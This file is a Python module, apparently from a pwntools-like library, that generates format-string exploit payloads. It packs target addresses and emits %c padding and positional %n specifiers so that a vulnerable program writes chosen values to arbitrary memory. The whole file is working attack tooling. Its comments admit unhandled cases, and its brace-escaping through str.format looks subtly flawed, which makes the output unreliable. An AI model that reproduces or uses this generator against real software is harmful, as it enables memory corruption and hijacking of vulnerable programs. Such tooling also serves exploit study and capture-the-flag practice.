from collections import namedtuple
from pwnlib.packer import *
from pwnlib.logger import log

Write = namedtuple("Write", ["what", "where", "width"])
Write.__new__.__defaults__ = (None, None, None)

class fmtstr:
	def __init__(self, writes=[]):
		self.writes = []
		for w in writes:
				self.write(*w)

	def write(self, what, where, width=""):
		self.writes.append(Write(what, where, width))

	def payload(self, startlen=0, startitem=1):
		# assumptions: only writes, no overlapping writes, width are already ok
		# todo: reduce assumptions by handling more general cases e.g. big startlen
		# handle not multiple of 4/8
		# addresses with null byte at the end of payload (max 1) or polymorphic payload
		# generalize different bits support
		writes = list(sorted(self.writes, key=lambda x: x.what))
		dsts = list(sorted(set(map(lambda x: x.where, writes)), reverse=1))
		n = startlen
		i = startitem
		pay = b""
		positions = {}
		tmp = []
		for w in writes:
			pad = w.what-n
			bits = 64
			while pad > bits/8 and len(dsts) > 0: # maybe add here check on null byte
				d = dsts.pop()
				positions[d] = i
				i += 1
				pay += p64(d).replace(b"{", b"\{").replace(b"}", b"\}")
				pad -= int(bits/8)

			if pad < 4:
				pay += b"A"*pad
			else:
				pay += bytes([ord(x) for x in "%{}c".format(pad)])

			pay += b"%{}$"+bytes([ord(x) for x in "{}".format(w.width)])+b"n"
			tmp.append(w.where)
			n = w.what

		# pad to multiple of address size, taking into account eventual starting slide, update i

		for d in dsts:
			pay += p64(d).replace(b"{", b"\{").replace(b"}", b"\}")
			positions[d] = i
			i += 1

		tmp = list(map(lambda x: positions[x], tmp))
		tmp2 = ""
		for b in pay:
			tmp2 += chr(b)
		pay = bytes([ord(x) for x in tmp2.format(*tmp)]) # fix addresses containing '{', '}'
		log.debug("Format string payload", pay)
		return pay